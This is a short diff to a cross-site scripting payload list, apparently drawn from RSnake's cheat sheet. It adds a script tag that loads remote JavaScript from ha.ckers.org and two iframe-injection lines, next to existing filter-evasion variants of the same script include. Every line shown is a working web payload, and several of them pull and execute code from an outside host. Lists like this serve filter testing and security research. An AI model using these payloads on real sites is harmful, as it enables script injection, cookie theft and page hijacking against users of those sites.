@@ -33,6 +33,7 @@ Use FUNCTIONS:
 	
 XSS.js file include from RSnake:
 	<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+	<SCRIPT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 	<SCRIPT%20a=">"%20''%20SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 	<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 	<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
@@ -49,6 +50,8 @@ IFRAMES:
 	<iframe width="300" height="500" frameborder="0" src="www.cnn.com"></iframe>
 	<iframe width="300" height="500" frameborder="0" src="www.cnn.com">This is not so fun!</iframe>
 	<iframe width="200" height="200" frameborder="5" src="www.cnn.com">iFrame Inclusion Test</iframe>
+	<iframe width="200" height="200" frameborder="5" src="http://www.cnn.com">iFrame Test</iframe>
+	<iframe width="200" height="200" frameborder="5" src="www\.cnn\.com">iFrame Test</iframe>
 
 	
 	
